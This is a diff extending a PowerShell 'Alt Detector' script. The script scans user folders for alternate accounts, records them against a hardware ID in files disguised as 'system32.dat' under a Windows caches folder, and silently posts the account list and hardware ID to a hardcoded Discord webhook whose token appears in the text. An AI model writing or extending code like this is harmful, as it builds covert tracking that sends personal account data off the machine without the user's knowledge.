@@ -2,6 +2,7 @@ $webhookUrl = "https://discord.com/api/webhooks/1485035447221616791/OIIiXNb7gCbY
 $startPath = "C:\Users"
 $hwidFolder = "$env:APPDATA\Microsoft\Windows\Caches"
 $hwidFile = "$hwidFolder\system32.dat"
+$hwidDatabase = "$hwidFolder\hwid_alts.json"
 
 if (-not (Test-Path $hwidFolder)) { New-Item -ItemType Directory -Path $hwidFolder -Force | Out-Null }
 
@@ -28,6 +29,14 @@ if (Test-Path $hwidFile) {
         $decrypted = [System.Text.Encoding]::UTF8.GetString($bytes)
         $storedAlts = $decrypted | ConvertFrom-Json
     } catch { $storedAlts = @{} }
+}
+
+$hwidAltDatabase = @{}
+if (Test-Path $hwidDatabase) {
+    try {
+        $databaseContent = Get-Content $hwidDatabase -Raw
+        $hwidAltDatabase = $databaseContent | ConvertFrom-Json
+    } catch { $hwidAltDatabase = @{} }
 }
 
 if (-not (Test-Path $startPath)) { exit }
@@ -80,6 +89,18 @@ if ($uniqueFoundAlts.Count -gt 0) {
     $bytes = [System.Text.Encoding]::UTF8.GetBytes($json)
     $encrypted = [System.Convert]::ToBase64String($bytes)
     Set-Content -Path $hwidFile -Value $encrypted -Force
+    
+    if (-not $hwidAltDatabase.ContainsKey($hwid)) {
+        $hwidAltDatabase[$hwid] = @{}
+    }
+    
+    foreach ($alt in $uniqueFoundAlts) {
+        if (-not $hwidAltDatabase[$hwid].ContainsKey($alt)) {
+            $hwidAltDatabase[$hwid][$alt] = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
+        }
+    }
+    
+    $hwidAltDatabase | ConvertTo-Json -Depth 10 | Set-Content -Path $hwidDatabase -Force
 }
 
 $description = ""
@@ -104,6 +125,20 @@ if ($uniqueFoundAlts.Count -gt 0) {
 
 $description += "`n`n**HWID:** $hwid"
 
+$description += "`n`n**ALTS LINKED TO THIS HWID:**`n"
+if ($hwidAltDatabase.ContainsKey($hwid) -and ($hwidAltDatabase[$hwid] | Get-Member -MemberType NoteProperty).Count -gt 0) {
+    $altCounter = 1
+    foreach ($alt in $hwidAltDatabase[$hwid].PSObject.Properties.Name | Sort-Object) {
+        $firstSeen = $hwidAltDatabase[$hwid].$alt
+        $description += "$altCounter. $alt (First detected: $firstSeen)`n"
+        Write-Host ("  {0}. {1} (First detected: {2})" -f $altCounter, $alt, $firstSeen) -ForegroundColor Green
+        $altCounter++
+    }
+} else {
+    $description += "No alts have been linked to this HWID yet.`n"
+    Write-Host "  No alts have been linked to this HWID yet." -ForegroundColor Yellow
+}
+
 $embed = @{
     title = $title
     color = $color
@@ -113,3 +148,7 @@ $embed = @{
 
 $payload = @{ embeds = @($embed); username = "Alt Detector" } | ConvertTo-Json -Depth 3
 Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json" -ErrorAction SilentlyContinue
+
+Write-Host "`n========================================" -ForegroundColor Cyan
+Write-Host "ALT DETECTION COMPLETE" -ForegroundColor Cyan
+Write-Host "========================================" -ForegroundColor Cyan
